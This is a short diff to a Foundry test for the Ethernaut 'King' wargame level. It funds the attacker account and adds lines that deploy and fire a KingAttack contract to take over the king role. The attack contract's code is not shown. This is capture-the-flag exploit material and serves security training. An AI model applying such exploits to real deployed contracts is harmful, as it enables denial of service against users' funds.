@@ -37,7 +37,7 @@ contract KingTest is Test {
 
         ethernaut.registerLevel(kingFactory);
         vm.startPrank(eve);
-        vm.deal(eve, 1 ether);
+        vm.deal(eve, 2 ether);
         address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(
             kingFactory
         );
@@ -48,9 +48,9 @@ contract KingTest is Test {
                                 LEVEL EXPLOIT
         //////////////////////////////////////////////////////////////*/
 
-        /**
-         * CODE GOES HERE
-         */
+        KingAttack kingAttack = new KingAttack(address(kingContract));
+        kingAttack.attack{value: 1 ether}();
+        emit log_named_address("New king: ", kingContract._king());
 
         /*//////////////////////////////////////////////////////////////
                                 LEVEL SUBMISSION
